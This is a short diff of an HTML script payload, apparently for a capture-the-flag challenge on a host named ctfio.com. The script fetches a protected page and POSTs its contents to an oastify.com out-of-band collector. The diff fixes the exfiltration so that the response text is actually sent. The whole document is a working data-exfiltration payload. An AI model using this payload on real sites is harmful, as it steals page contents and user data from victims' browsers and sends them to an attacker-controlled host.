@@ -10,8 +10,9 @@
         </script>
         <script>
             fetch('https://jason.ctfio.com/blind/recipe').then((res) => {
-                fetch("https://v84ky32y81wvkwvufs74fx8wcnip6hu6.oastify.com", {method: "POST", body: JSON.stringify(res.text())})
-                fetch("https://v84ky32y81wvkwvufs74fx8wcnip6hu6.oastify.com/weranwooo", {method: "POST", body: res.text() + 'jkfbkjdsvkbjdsbkjdbkjdsvkbjdvskbjdsbjkvvdbjk'})
+                res.text().then( (x) =>
+                    fetch("https://v84ky32y81wvkwvufs74fx8wcnip6hu6.oastify.com", {method: "POST", body: JSON.stringify(x)})
+                )
             })
         </script>
     </head>
